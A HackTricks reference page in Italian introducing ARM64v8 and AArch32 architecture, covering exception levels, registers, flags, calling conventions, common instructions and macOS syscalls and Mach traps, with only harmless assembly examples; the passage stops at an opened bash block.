# Introduzione ad ARM64v8

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Livelli di Eccezione - EL (ARM64v8)**

Nell'architettura ARMv8, i livelli di esecuzione, noti come Livelli di Eccezione (EL), definiscono il livello di privilegio e le capacità dell'ambiente di esecuzione. Ci sono quattro livelli di eccezione, che vanno da EL0 a EL3, ognuno con uno scopo diverso:

1. **EL0 - Modalità Utente**:
* Questo è il livello meno privilegiato e viene utilizzato per eseguire il codice dell'applicazione regolare.
* Le applicazioni in esecuzione a EL0 sono isolate l'una dall'altra e dal software di sistema, migliorando la sicurezza e la stabilità.
2. **EL1 - Modalità Kernel del Sistema Operativo**:
* La maggior parte dei kernel del sistema operativo funziona a questo livello.
* EL1 ha più privilegi rispetto a EL0 e può accedere alle risorse di sistema, ma con alcune restrizioni per garantire l'integrità del sistema.
3. **EL2 - Modalità Hypervisor**:
* Questo livello è utilizzato per la virtualizzazione. Un hypervisor in esecuzione a EL2 può gestire più sistemi operativi (ciascuno nel proprio EL1) in esecuzione sull'hardware fisico.
* EL2 fornisce funzionalità per l'isolamento e il controllo degli ambienti virtualizzati.
4. **EL3 - Modalità Monitor Sicuro**:
* Questo è il livello più privilegiato e viene spesso utilizzato per l'avvio sicuro e gli ambienti di esecuzione affidabili.
* EL3 può gestire e controllare gli accessi tra stati sicuri e non sicuri (come l'avvio sicuro, il sistema operativo affidabile, ecc.).

L'uso di questi livelli consente di gestire in modo strutturato e sicuro diversi aspetti del sistema, dalle applicazioni utente al software di sistema più privilegiato. L'approccio di ARMv8 ai livelli di privilegio aiuta a isolare efficacemente diversi componenti di sistema, migliorando così la sicurezza e la robustezza del sistema.

## **Registri (ARM64v8)**

ARM64 ha **31 registri a scopo generale**, etichettati da `x0` a `x30`. Ciascuno può memorizzare un valore **64-bit** (8-byte). Per operazioni che richiedono solo valori a 32 bit, gli stessi registri possono essere accessibili in modalità a 32 bit utilizzando i nomi w0 a w30.

1. **`x0`** a **`x7`** - Questi sono tipicamente utilizzati come registri temporanei e per passare parametri alle subroutine.
* **`x0`** contiene anche i dati di ritorno di una funzione.
2. **`x8`** - Nel kernel Linux, `x8` è utilizzato come numero di chiamata di sistema per l'istruzione `svc`. **In macOS è il x16 che viene utilizzato!**
3. **`x9`** a **`x15`** - Altri registri temporanei, spesso utilizzati per variabili locali.
4. **`x16`** e **`x17`** - **Registri di Chiamata Intra-procedurale**. Registri temporanei per valori immediati. Vengono anche utilizzati per chiamate a funzioni indirette e stub PLT (Procedure Linkage Table).
* **`x16`** è utilizzato come **numero di chiamata di sistema** per l'istruzione **`svc`** in **macOS**.
5. **`x18`** - **Registro di Piattaforma**. Può essere utilizzato come registro a scopo generale, ma su alcune piattaforme questo registro è riservato per usi specifici della piattaforma: Puntatore al blocco dell'ambiente del thread corrente in Windows, o per puntare alla struttura del compito attualmente **in esecuzione nel kernel Linux**.
6. **`x19`** a **`x28`** - Questi sono registri salvati dal chiamante. Una funzione deve preservare i valori di questi registri per il chiamante, quindi vengono memorizzati nello stack e ripristinati prima di tornare al chiamante.
7. **`x29`** - **Puntatore al Frame** per tenere traccia del frame dello stack. Quando viene creato un nuovo frame dello stack perché viene chiamata una funzione, il registro **`x29`** viene **memorizzato nello stack** e l'indirizzo del **nuovo** puntatore al frame (indirizzo **`sp`**) viene **memorizzato in questo registro**.
* Questo registro può anche essere utilizzato come **registro a scopo generale** anche se di solito viene utilizzato come riferimento per le **variabili locali**.
8. **`x30`** o **`lr`**- **Registro di Link**. Contiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore di **`pc`** in questo registro.
* Può essere utilizzato come qualsiasi altro registro.
* Se la funzione corrente sta per chiamare una nuova funzione e quindi sovrascrivere `lr`, lo memorizzerà nello stack all'inizio, questo è l'epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Memorizza `fp` e `lr`, genera spazio e ottieni nuovo `fp`) e lo recupererà alla fine, questo è il prologo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e ritorna).
9. **`sp`** - **Puntatore dello Stack**, utilizzato per tenere traccia della cima dello stack.
* il valore di **`sp`** dovrebbe sempre essere mantenuto almeno a un **allineamento di quadword** o potrebbe verificarsi un'eccezione di allineamento.
10. **`pc`** - **Contatore di Programma**, che punta alla prossima istruzione. Questo registro può essere aggiornato solo attraverso generazioni di eccezioni, ritorni di eccezioni e branch. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni di branch con link (BL, BLR) per memorizzare l'indirizzo **`pc`** in **`lr`** (Registro di Link).
11. **`xzr`** - **Registro Zero**. Chiamato anche **`wzr`** nella sua forma a registro **32**-bit. Può essere utilizzato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti usando **`subs`** come **`subs XZR, Xn, #10`** memorizzando i dati risultanti da nessuna parte (in **`xzr`**).

I registri **`Wn`** sono la versione a **32 bit** del registro **`Xn`**.

### Registri SIMD e in Virgola Mobile

Inoltre, ci sono altri **32 registri di lunghezza 128 bit** che possono essere utilizzati in operazioni ottimizzate di singola istruzione su dati multipli (SIMD) e per eseguire operazioni aritmetiche in virgola mobile. Questi sono chiamati registri Vn anche se possono operare anche in **64**-bit, **32**-bit, **16**-bit e **8**-bit e quindi sono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.
### Registri di sistema

**Ci sono centinaia di registri di sistema**, chiamati anche registri a scopo speciale (SPR), utilizzati per **monitorare** e **controllare** il **comportamento dei processori**.\
Possono essere letti o impostati solo utilizzando le istruzioni speciali dedicate **`mrs`** e **`msr`**.

I registri speciali **`TPIDR_EL0`** e **`TPIDDR_EL0`** sono comunemente trovati durante l'ingegneria inversa. Il suffisso `EL0` indica la **minima eccezione** dalla quale il registro può essere accessibile (in questo caso EL0 è il livello di eccezione (privilegio) regolare con cui i programmi regolari vengono eseguiti).\
Sono spesso utilizzati per memorizzare l'**indirizzo di base della regione di memoria dello storage locale del thread**. Di solito il primo è leggibile e scrivibile per i programmi in esecuzione in EL0, ma il secondo può essere letto da EL0 e scritto da EL1 (come il kernel).

* `mrs x0, TPIDR_EL0 ; Leggi TPIDR_EL0 in x0`
* `msr TPIDR_EL0, X0 ; Scrivi x0 in TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale **`SPSR_ELx`**, essendo X il **livello di permesso dell'eccezione** scatenata (ciò consente di ripristinare lo stato del processo quando l'eccezione termina).\
Questi sono i campi accessibili:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
* **`N`** significa che l'operazione ha prodotto un risultato negativo
* **`Z`** significa che l'operazione ha prodotto zero
* **`C`** significa che l'operazione è stata eseguita
* **`V`** significa che l'operazione ha prodotto un overflow con segno:
* La somma di due numeri positivi produce un risultato negativo.
* La somma di due numeri negativi produce un risultato positivo.
* Nella sottrazione, quando un grande numero negativo viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato all'interno dell'intervallo della dimensione dei bit dati.
* Ovviamente il processore non sa se l'operazione è con segno o meno, quindi controllerà C e V nelle operazioni e indicherà se si è verificato un trasporto nel caso fosse con segno o senza.

{% hint style="warning" %}
Non tutte le istruzioni aggiornano questi flag. Alcune come **`CMP`** o **`TST`** lo fanno, e altre che hanno un suffisso s come **`ADDS`** lo fanno anche.
{% endhint %}

* Il flag attuale della **larghezza del registro (`nRW`)**: Se il flag ha il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 una volta ripreso.
* Il **livello di eccezione corrente** (**`EL`**): Un programma regolare in esecuzione in EL0 avrà il valore 0
* Il flag di **singolo passaggio** (**`SS`**): Usato dai debugger per eseguire un passo alla volta impostando il flag SS su 1 all'interno di **`SPSR_ELx`** tramite un'eccezione. Il programma eseguirà un passo e emetterà un'eccezione di passo singolo.
* Il flag di stato di eccezione **illegale** (**`IL`**): Viene utilizzato per segnalare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido, questo flag viene impostato su 1 e il processore scatena un'eccezione di stato illegale.
* I flag **`DAIF`**: Questi flag consentono a un programma privilegiato di mascherare selettivamente determinate eccezioni esterne.
* Se **`A`** è 1 significa che verranno scatenati **aborti asincroni**. **`I`** configura la risposta alle **Richieste di Interruzione Hardware** esterne (IRQs). e F è relativo alle **Richieste di Interruzione Rapida** (FIRs).
* I flag di selezione dello stack pointer (**`SPS`**): I programmi privilegiati in esecuzione in EL1 e superiori possono passare dall'utilizzare il proprio registro dello stack pointer a quello del modello utente (ad es. tra `SP_EL1` e `EL0`). Questo passaggio viene eseguito scrivendo nel registro speciale **`SPSel`**. Questo non può essere fatto da EL0.

## **Convenzione di chiamata (ARM64v8)**

La convenzione di chiamata ARM64 specifica che i **primi otto parametri** di una funzione vengono passati nei registri **`x0` attraverso `x7`**. I **parametri aggiuntivi** vengono passati nello **stack**. Il valore di **ritorno** viene restituito nel registro **`x0`**, o anche in **`x1`** se è lungo 128 bit. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** durante le chiamate alle funzioni.

Quando si legge una funzione in assembly, cercare il **prologo e l'epilogo** della funzione. Il **prologo** di solito coinvolge il **salvataggio del frame pointer (`x29`)**, la **configurazione** di un **nuovo frame pointer**, e l'**allocazione dello spazio dello stack**. L'**epilogo** di solito coinvolge il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.

### Convenzione di chiamata in Swift

Swift ha la sua **convenzione di chiamata** che può essere trovata in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Istruzioni Comuni (ARM64v8)**

Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il **registro di destinazione** dove verrà memorizzato il risultato, e **`src1`** e **`src2`** sono i **registri di origine**. Possono essere utilizzati anche valori immediati al posto dei registri di origine.

* **`mov`**: **Sposta** un valore da un **registro** a un altro.
* Esempio: `mov x0, x1` — Questo sposta il valore da `x1` a `x0`.
* **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
* Esempio: `ldr x0, [x1]` — Questo carica un valore dalla posizione di memoria puntata da `x1` in `x0`.
* **Modalità di offset**: Viene indicato un offset che influisce sul puntatore di origine, ad esempio:
* `ldr x2, [x1, #8]`, questo caricherà in x2 il valore da x1 + 8
* &#x20;`ldr x2, [x0, x1, lsl #2]`, questo caricherà in x2 un oggetto dall'array x0, dalla posizione x1 (indice) \* 4
* **Modalità pre-indicizzata**: Questo applicherà calcoli all'origine, otterrà il risultato e memorizzerà anche la nuova origine nell'origine.
* `ldr x2, [x1, #8]!`, questo caricherà `x1 + 8` in `x2` e memorizzerà in x1 il risultato di `x1 + 8`
* `str lr, [sp, #-4]!`, Memorizza il registro di link in sp e aggiorna il registro sp
* **Modalità post-indicizzata**: È simile alla precedente ma l'indirizzo di memoria viene accesso e poi viene calcolato e memorizzato l'offset.
* `ldr x0, [x1], #8`, carica `x1` in `x0` e aggiorna x1 con `x1 + 8`
* **Indirizzamento relativo al PC**: In questo caso l'indirizzo da caricare viene calcolato in relazione al registro PC
* `ldr x1, =_start`, Questo caricherà l'indirizzo in cui inizia il simbolo `_start` in x1 relativo al PC corrente.
* **`str`**: **Memorizza** un valore da un **registro** nella **memoria**.
* Esempio: `str x0, [x1]` — Questo memorizza il valore in `x0` nella posizione di memoria puntata da `x1`.
* **`ldp`**: **Carica Coppia di Registri**. Questa istruzione **carica due registri** da **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
* Esempio: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle posizioni di memoria in `x2` e `x2 + 8`, rispettivamente.
* **`stp`**: **Memorizza Coppia di Registri**. Questa istruzione **memorizza due registri** in **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
* Esempio: `stp x0, x1, [sp]` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp` e `sp + 8`, rispettivamente.
* `stp x0, x1, [sp, #16]!` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
* **`add`**: **Aggiunge** i valori di due registri e memorizza il risultato in un registro.
* Sintassi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX\]
* Xn1 -> Destinazione
* Xn2 -> Operando 1
* Xn3 | #imm -> Operando 2 (registro o immediato)
* \[shift #N | RRX\] -> Esegue uno shift o chiama RRX
* Esempio: `add x0, x1, x2` — Questo somma i valori in `x1` e `x2` insieme e memorizza il risultato in `x0`.
* `add x5, x5, #1, lsl #12` — Questo equivale a 4096 (un 1 shiftato 12 volte) -> 1 0000 0000 0000 0000
* **`adds`** Questo esegue un `add` e aggiorna i flag
* **`sub`**: **Sottrai** i valori di due registri e memorizza il risultato in un registro.
* Controlla la **sintassi di `add`**.
* Esempio: `sub x0, x1, x2` — Questo sottrae il valore in `x2` da `x1` e memorizza il risultato in `x0`.
* **`subs`** Questo è come sub ma aggiorna il flag
* **`mul`**: **Moltiplica** i valori di **due registri** e memorizza il risultato in un registro.
* Esempio: `mul x0, x1, x2` — Questo moltiplica i valori in `x1` e `x2` e memorizza il risultato in `x0`.
* **`div`**: **Dividi** il valore di un registro per un altro e memorizza il risultato in un registro.
* Esempio: `div x0, x1, x2` — Questo divide il valore in `x1` per `x2` e memorizza il risultato in `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Shift logico a sinistra**: Aggiunge 0 dalla fine spostando gli altri bit in avanti (moltiplica n volte per 2)
* **Shift logico a destra**: Aggiunge 1 all'inizio spostando gli altri bit all'indietro (divide n volte per 2 in non firmato)
* **Shift aritmetico a destra**: Come **`lsr`**, ma invece di aggiungere 0 se il bit più significativo è 1, \*\*aggiunge 1 (\*\*divide n volte per 2 in firmato)
* **Ruota a destra**: Come **`lsr`** ma qualsiasi cosa venga rimossa da destra viene aggiunta a sinistra
* **Ruota a destra con estensione**: Come **`ror`**, ma con il flag di carry come "bit più significativo". Quindi il flag di carry viene spostato al bit 31 e il bit rimosso al flag di carry.
* **`bfm`**: **Spostamento di bit di campo**, queste operazioni **copiano i bit `0...n`** da un valore e li collocano nelle posizioni **`m..m+n`**. Il **`#s`** specifica la posizione del bit più a sinistra e **`#r`** la quantità di rotazione a destra.
* Spostamento di bit: `BFM Xd, Xn, #r`
* Spostamento di bit firmato: `SBFM Xd, Xn, #r, #s`
* Spostamento di bit non firmato: `UBFM Xd, Xn, #r, #s`
* **Estrai e inserisci bitfield:** Copia un bitfield da un registro e lo copia in un altro registro.
* **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 dal 3° bit di X1
* **`BFXIL X1, X2, #3, #4`** Estrae dal 3° bit di X2 quattro bit e li copia in X1
* **`SBFIZ X1, X2, #3, #4`** Estende il segno di 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra
* **`SBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2, estende il segno e inserisce il risultato in X1
* **`UBFIZ X1, X2, #3, #4`** Estende a zero 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra
* **`UBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2 e inserisce il risultato esteso a zero in X1.
* **Estendi il segno a X:** Estende il segno (o aggiunge solo 0 nella versione non firmata) di un valore per poter eseguire operazioni con esso:
* **`SXTB X1, W2`** Estende il segno di un byte **da W2 a X1** (`W2` è la metà di `X2`) per riempire i 64 bit
* **`SXTH X1, W2`** Estende il segno di un numero a 16 bit **da W2 a X1** per riempire i 64 bit
* **`SXTW X1, W2`** Estende il segno di un byte **da W2 a X1** per riempire i 64 bit
* **`UXTB X1, W2`** Aggiunge 0 (non firmato) a un byte **da W2 a X1** per riempire i 64 bit
* **`extr`:** Estrae bit da una **coppia di registri concatenati** specificati.
* Esempio: `EXTR W3, W2, W1, #3` Questo **concatena W1+W2** e prende **dal bit 3 di W2 fino al bit 3 di W1** e lo memorizza in W3.
* **`cmp`**: **Confronta** due registri e imposta i flag di condizione. È un **alias di `subs`** impostando il registro di destinazione al registro zero. Utile per sapere se `m == n`.
* Supporta la **stessa sintassi di `subs`**
* Esempio: `cmp x0, x1` — Questo confronta i valori in `x0` e `x1` e imposta i flag di condizione di conseguenza.
* **`cmn`**: **Confronto negativo** dell'operando. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. Utile per sapere se `m == -n`.
* **`ccmp`**: Confronto condizionale, è un confronto che verrà eseguito solo se un confronto precedente è stato vero e imposterà specificamente i bit nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta a func
* Questo perché **`ccmp`** verrà eseguito solo se il **precedente `cmp` era un `NE`**, se non lo fosse i bit `nzcv` verranno impostati a 0 (che non soddisferà il confronto `blt`).
* Questo può anche essere usato come `ccmn` (stesso ma negativo, come `cmp` vs `cmn`).
* **`tst`**: Controlla se i valori del confronto sono entrambi 1 (funziona come un ANDS senza memorizzare il risultato da nessuna parte). È utile per controllare un registro con un valore e verificare se uno qualsiasi dei bit del registro indicato nel valore è 1.
* Esempio: `tst X1, #7` Controlla se uno qualsiasi degli ultimi 3 bit di X1 è 1
* **`teq`**: Operazione XOR scartando il risultato
* **`b`**: Salto incondizionato
* Esempio: `b myFunction`&#x20;
* Nota che questo non riempirà il registro di collegamento con l'indirizzo di ritorno (non adatto per le chiamate a subroutine che devono tornare indietro)
* **`bl`**: **Salto** con collegamento, usato per **chiamare** una **sottoroutine**. Memorizza l'**indirizzo di ritorno in `x30`**.
* Esempio: `bl myFunction` — Questo chiama la funzione `myFunction` e memorizza l'indirizzo di ritorno in `x30`.
* Nota che questo non riempirà il registro di collegamento con l'indirizzo di ritorno (non adatto per le chiamate a subroutine che devono tornare indietro)
* **`blr`**: **Salto** con collegamento al registro, usato per **chiamare** una **sottoroutine** dove il target è **specificato** in un **registro**. Memorizza l'indirizzo di ritorno in `x30`. (Questo è&#x20;
* Esempio: `blr x1` — Questo chiama la funzione il cui indirizzo è contenuto in `x1` e memorizza l'indirizzo di ritorno in `x30`.
* **`ret`**: **Ritorna** dalla **sottoroutine**, tipicamente utilizzando l'indirizzo in **`x30`**.
* Esempio: `ret` — Questo ritorna dalla sottoroutine corrente utilizzando l'indirizzo di ritorno in `x30`.
* **`b.<cond>`**: Salti condizionali
* **`b.eq`**: **Salta se uguale**, basato sull'istruzione `cmp` precedente.
* Esempio: `b.eq label` — Se l'istruzione `cmp` precedente ha trovato due valori uguali, questo salta a `label`.
* **`b.ne`**: **Branch se Non Uguale**. Questa istruzione controlla i flag di condizione (che sono stati impostati da un'istruzione di confronto precedente), e se i valori confrontati non erano uguali, salta a un'etichetta o indirizzo.
* Esempio: Dopo un'istruzione `cmp x0, x1`, `b.ne label` — Se i valori in `x0` e `x1` non erano uguali, salta a `label`.
* **`cbz`**: **Confronta e Salta se Zero**. Questa istruzione confronta un registro con zero, e se sono uguali, salta a un'etichetta o indirizzo.
* Esempio: `cbz x0, label` — Se il valore in `x0` è zero, salta a `label`.
* **`cbnz`**: **Confronta e Salta se Non Zero**. Questa istruzione confronta un registro con zero, e se non sono uguali, salta a un'etichetta o indirizzo.
* Esempio: `cbnz x0, label` — Se il valore in `x0` non è zero, salta a `label`.
* **`tbnz`**: Testa il bit e salta se non zero
* Esempio: `tbnz x0, #8, label`
* **`tbz`**: Testa il bit e salta se zero
* Esempio: `tbz x0, #8, label`
* **Operazioni di selezione condizionale**: Sono operazioni il cui comportamento varia a seconda dei bit condizionali.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se vero, X0 = X1, se falso, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Se vero, Xd = Xn + 1, se falso, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = NON(Xm)
* `cinv Xd, Xn, cond` -> Se vero, Xd = NON(Xn), se falso, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = - Xm
* `cneg Xd, Xn, cond` -> Se vero, Xd = - Xn, se falso, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Se vero, Xd = 1, se falso, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Se vero, Xd = \<tutti 1>, se falso, Xd = 0
* **`adrp`**: Calcola l'**indirizzo di pagina di un simbolo** e lo memorizza in un registro.
* Esempio: `adrp x0, symbol` — Questo calcola l'indirizzo di pagina di `symbol` e lo memorizza in `x0`.
* **`ldrsw`**: **Carica** un valore firmato **di 32 bit** dalla memoria e **estende il segno a 64** bit.
* Esempio: `ldrsw x0, [x1]` — Questo carica un valore firmato di 32 bit dalla posizione di memoria puntata da `x1`, lo estende a 64 bit e lo memorizza in `x0`.
* **`stur`**: **Memorizza un valore di registro in una posizione di memoria**, utilizzando un offset da un altro registro.
* Esempio: `stur x0, [x1, #4]` — Questo memorizza il valore in `x0` nell'indirizzo di memoria che è 4 byte maggiore rispetto all'indirizzo attualmente in `x1`.
* **`svc`** : Effettua una **chiamata di sistema**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, **passa dalla modalità utente alla modalità kernel** e salta a una posizione specifica in memoria dove si trova il codice di gestione delle chiamate di sistema del **kernel**.
*   Esempio:

```armasm
mov x8, 93  ; Carica il numero di chiamata di sistema per l'uscita (93) nel registro x8.
mov x0, 0   ; Carica il codice di stato di uscita (0) nel registro x0.
svc 0       ; Effettua la chiamata di sistema.
```

### **Prologo della Funzione**

1. **Salva il registro del link e il puntatore del frame nello stack**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Imposta il nuovo frame pointer**: `mov x29, sp` (imposta il nuovo frame pointer per la funzione corrente)
3. **Allocare spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessario)

### **Epilogo della Funzione**

1. **Dealloca le variabili locali (se ne sono state allocate)**: `add sp, sp, <size>`
2. **Ripristina il registro del link e il frame pointer**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Ritorno**: `ret` (restituisce il controllo al chiamante utilizzando l'indirizzo nel registro di collegamento)

## Stato di esecuzione AARCH32

Armv8-A supporta l'esecuzione di programmi a 32 bit. **AArch32** può funzionare in uno dei **due set di istruzioni**: **`A32`** e **`T32`** e può passare da uno all'altro tramite **`interworking`**.\
I programmi **privilegiati** a 64 bit possono pianificare l'**esecuzione di programmi a 32 bit** eseguendo un trasferimento di livello di eccezione al 32 bit a livello di privilegio inferiore.\
Si noti che la transizione da 64 bit a 32 bit avviene con un abbassamento del livello di eccezione (ad esempio un programma a 64 bit in EL1 che attiva un programma in EL0). Ciò viene fatto impostando il **bit 4 di** **`SPSR_ELx`** registro speciale **a 1** quando il thread del processo `AArch32` è pronto per essere eseguito e il resto di `SPSR_ELx` memorizza i programmi **`AArch32`** CPSR. Quindi, il processo privilegiato chiama l'istruzione **`ERET`** in modo che il processore passi a **`AArch32`** entrando in A32 o T32 a seconda di CPSR\*\*.\*\*

L'**`interworking`** avviene utilizzando i bit J e T di CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Questo si traduce fondamentalmente nell'impostare il **bit più basso a 1** per indicare che il set di istruzioni è T32.\
Questo viene impostato durante le **istruzioni di branch interworking**, ma può anche essere impostato direttamente con altre istruzioni quando il PC è impostato come registro di destinazione. Esempio:

Un altro esempio:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Ci sono 16 registri da 32 bit (r0-r15). Da r0 a r14 possono essere utilizzati per qualsiasi operazione, tuttavia alcuni di essi sono di solito riservati:

- `r15`: Contatore di programma (sempre). Contiene l'indirizzo dell'istruzione successiva. In A32 corrente + 8, in T32, corrente + 4.
- `r11`: Frame Pointer
- `r12`: Registro di chiamata intra-procedurale
- `r13`: Stack Pointer
- `r14`: Link Register

Inoltre, i registri sono salvati nei `registri bancati`. Questi sono luoghi che memorizzano i valori dei registri consentendo di eseguire **cambiamenti di contesto veloci** nella gestione delle eccezioni e delle operazioni privilegiate per evitare la necessità di salvare e ripristinare manualmente i registri ogni volta.\
Questo avviene salvando lo stato del processore dal `CPSR` al `SPSR` della modalità del processore a cui viene gestita l'eccezione. Al ritorno dall'eccezione, il `CPSR` viene ripristinato dal `SPSR`.

### CPSR - Current Program Status Register

In AArch32 il CPSR funziona in modo simile a `PSTATE` in AArch64 ed è anche memorizzato in `SPSR_ELx` quando viene gestita un'eccezione per ripristinare in seguito l'esecuzione:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

I campi sono divisi in alcuni gruppi:

- Application Program Status Register (APSR): Flag aritmetici e accessibili da EL0
- Execution State Registers: Comportamento del processo (gestito dal sistema operativo).

#### Application Program Status Register (APSR)

- I flag `N`, `Z`, `C`, `V` (come in AArch64)
- Il flag `Q`: Viene impostato a 1 ogni volta che si verifica una **saturazione intera** durante l'esecuzione di un'istruzione aritmetica di saturazione specializzata. Una volta impostato a 1, manterrà il valore fino a quando non verrà impostato manualmente a 0. Inoltre, non c'è alcuna istruzione che controlla il suo valore implicitamente, deve essere fatto leggendolo manualmente.
- Flag `GE` (Greater than or equal): Viene utilizzato nelle operazioni SIMD (Single Instruction, Multiple Data), come "addizione parallela" e "sottrazione parallela". Queste operazioni consentono di elaborare più punti dati in un'unica istruzione.

Ad esempio, l'istruzione `UADD8` **aggiunge quattro coppie di byte** (da due operandi da 32 bit) in parallelo e memorizza i risultati in un registro da 32 bit. Quindi **imposta i flag `GE` nell'`APSR`** in base a questi risultati. Ogni flag GE corrisponde a una delle addizioni di byte, indicando se l'addizione per quella coppia di byte ha **overflowed**.

L'istruzione `SEL` utilizza questi flag GE per eseguire azioni condizionali.

#### Execution State Registers

- I bit `J` e `T`: `J` dovrebbe essere 0 e se `T` è 0 viene utilizzato il set di istruzioni A32, e se è 1 viene utilizzato il set di istruzioni T32.
- IT Block State Register (`ITSTATE`): Questi sono i bit da 10-15 e 25-26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo con prefisso `IT`.
- Bit `E`: Indica la **endianness**.
- Bit di modalità e maschera di eccezione (0-4): Determinano lo stato di esecuzione corrente. Il quinto indica se il programma viene eseguito come 32 bit (un 1) o 64 bit (un 0). Gli altri 4 rappresentano la **modalità di eccezione attualmente in uso** (quando si verifica un'eccezione e viene gestita). Il numero impostato **indica la priorità corrente** nel caso in cui venga scatenata un'altra eccezione mentre questa viene gestita.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- `AIF`: Alcune eccezioni possono essere disabilitate utilizzando i bit `A`, `I`, `F`. Se `A` è 1 significa che verranno scatenati **aborti asincroni**. `I` configura la risposta alle **Richieste di Interruzione Esterna** (IRQs). e F è relativo alle **Richieste di Interruzione Rapida** (FIRs).

## macOS

### Chiamate di sistema BSD

Controlla [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Le chiamate di sistema BSD avranno **x16 > 0**.

### Trappole Mach

Controlla in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` e in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) i prototipi. Il numero massimo di trappole Mach è `MACH_TRAP_TABLE_COUNT` = 128. Le trappole Mach avranno **x16 < 0**, quindi è necessario chiamare i numeri dalla lista precedente con un **meno**: **`_kernelrpc_mach_vm_allocate_trap`** è **`-10`**.

Puoi anche controllare **`libsystem_kernel.dylib`** in un disassemblatore per capire come chiamare queste chiamate di sistema (e BSD):

{% code overflow="wrap" %}
```bash
# macOS
